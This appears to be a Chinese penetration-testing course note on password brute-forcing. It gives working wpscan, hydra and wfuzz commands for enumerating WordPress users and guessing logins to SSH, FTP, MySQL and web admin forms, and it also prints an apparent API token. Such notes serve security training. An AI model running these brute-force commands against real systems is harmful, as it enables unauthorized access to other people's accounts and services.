# 第一天：穷举

# 概述

穷举就是枚举的意思，在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为，弱口令 、中度口令、强度口令。 如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举弱口令对服务进行攻击，很容易就得到登录密码。得到密码之后就能登录服务，进行其他危害较大得操作。黑客也能通过对用户得信息整理，组合密码进行穷举攻击。例如：根据用户的生日号码，出身年月日和姓名进行口令组合，再对其服务进行穷举；

# 有 token 防御的网站后台穷举破

https://www.yuque.com/docs/share/67c10d67-d871-4535-8ac8-c45d598b8eb3?#（密码：gyqa） 《Token 防爆破》

有的网站后台存在 token 值，这个 token 通俗的名字叫令牌，每次刷新页面都会随机变化，提交请求时必须携带这个 token 值，可以利用这点避免后台进行直接穷举和防止 csrf 攻击；

我们每次刷新，都可以看到这个 token 的值会改变；

但如果直接爆破的话会是用的第一次的 token 的值，如果第二次密码进行匹配的时候，他还是第一次的 token 的值的话，服务端那边的 token 的值就是不匹配的，所以就会提示 csrf 攻击；

所以我们每次进行爆破的时候也许要让他跟随改变；

# wordpress 博客系统用户密码穷举

wordpress 是知名的博客系统，在互联网上的占有量很大，所以一定要知道这套 系统的弱口令穷举的方法；

爆破 wordpress 博客系统的话我们会用到 wpscan 这个工具，专门针对于 wordpress 博客系统进行安全评估的工具；

爆破之前我们需要先获取一个 token，因为 wordpress 有很多插件，需要使用 token 去加载插件，然后进行安全评估；

https://wpscan.com 首先到这个网站注册账号和密码注册后获取 token；

kali 自带 wpscan，-e u 参数自动找账号信息，然后登录穷举；

wpscan --url http://www.redteam.com/ -e u -P /home/kali/top100password.txt --api-token DTa0mUG4l04uquwu4WvAIJuFAESdT7hSoORsutqbf3c

如果上面这个工具爆破之后什么信息都没找到，那我们可以尝试手动查找信息爆破；

手动收集 wordpress 用户信息，访问连接获取用户：

    • /wp-json/wp/v2/users 获取信息可以再进行指定用户爆破；

获取到用户账户名后，在进行爆破；

wpscan --url http://www.redteam.com -U admin -P /home/kali/Desktop/top100password.txt

    • 使用账号名爆破就不需要在加 token 了；

# hydra 密码穷举工具的使用

Hydra 是一个相当强大的暴力密码破解工具。该工具支持几乎所有协议的在线密码破解，如 FTP、HTTP、HTTPS、MySQL、MS SQL、Oracle、Cisco、IMAP 和 VNC 等。其密码能否被破解，关键在于字典是否足够强大。很多用户可能对 Hydra 比较熟悉，因为该工具有图形界面，且操作十分简单，基本上可以 “傻瓜” 操作；

美国队长中的大反派 hydra（九头蛇）组织

hydra 是著名组织 thc 的一款开源的暴力破解密码工具，功能非常强大；

kali 下是默认安装的，几乎支持所有协议的在线破解；

# 使用 hydra 穷举 ssh 服务

hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.118 ssh -o ssh.txt -f ssh://192.168.1.118

hydra -l root -P password.txt -t 1 -vV -e ns 192.168.1.118 ssh -o ssh.txt -f

hydra -l root -P 2019_top100.txt 192.168.1.118 ssh -vV -f

    • -L 用户字典文件
    • -P 密码字典文件
    • -t 线程数
    • -vV 详细信息
    • -e ns 使用空口令 使用指定用户和密码试探
    • 192.168.1.104 你要穷举的 ip
    • ssh 是服务
    • -o 保存文件
    • -f 如果找到马上中断扫描

# 使用 hydra 穷举 ftp 服务

hydra -L 用户名字典 -P 密码字典 -t6-e ns IP 地址 -v

hydra ip ftp -l 用户名 -P 密码字典 -t 线程 (默认 16) -vV

实例：

hydra 192.168.1.117 ftp -l admin -P top100password.txt -t30 -vV

# 使用 hydra 穷举 mysql 服务

hydra ip mysql -l 用户名 -P 密码字典 -t 线程 (默认 16) -vV

    • hydra 192.168.1.117 mysql -l root -P top100password.txt -t 3 -vV

hydra ip mysql -l 用户名 -P 密码字典 -e ns -vV

    • hydra 192.168.1.117 mysql -l root -P top100password.txt -e ns -vV

hydra ip mysql -l 用户名 -P 密码字典 -e ns -vV -s 端口

    • hydra 192.168.1.117 mysql -l root -P top100password.txt -e ns -vV -s 3306

# wfuzz 多线程穷举密码

Wfuzz 是一款为了评估 WEB 应用而生的 Fuzz（Fuzz 是爆破的一种手段）工具，它基于一个简单的理念，即用给定的 Payload 去 fuzz。它允许在 HTTP 请求里注入任何输入的值，针对不同的 WEB 应用组件进行多种复杂的爆破攻击。比如：参数、认证、表单、目录 / 文件、头部等等，这款工具在 kali 里面自带；

可以用 Wfuzz 找到下面的漏洞：

  • 可预测的认证

  • 可预测的 session 标志（session id）

  • 可预测的资源定位（目录和文件）

  • 注入

  • 路径遍历

  • 溢出

  • 跨站脚本

  • 认证漏洞

  • 不安全的直接对象引用

  • ………

# 使用实例：

GET 类型爆破：

    • wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z
    • 注意，多个参数，就用多个占位符，比如：FUZZ,FUZ2Z,FUZ3Z,FUZnZ；

POST 类型爆破：

    • wfuzz -c -z file,2019_top100.txt --sc 302 -u http://www.c1moon.com/admin/index.php?action=login -d “user=admin&pw=FUZZ”

另外两种方式：

    • wfuzz -c -z file,top100password.txt --hc 404 --hh 1549 -u http://www.c1moon.com/admin/index.php?action=login -d “user=admin&pw=FUZZ”
      • 排除，我们都知道，登陆成功的话很多网站都会是 302 跳转，那我们可以通过–hc 参数排除 404 的状态码，–hh 排除 1549 的长度包；
    • wfuzz -c -w /home/kali/csdnpass.txt --hc 404 --hh 1549 -u http://www.c1moon.com/admin/index.php?action=login -d “user=admin&pw=FUZZ”
      • 同上排除，只不过是加载密码文件方式不一样了，直接使用 - w 参数加载密码文件；
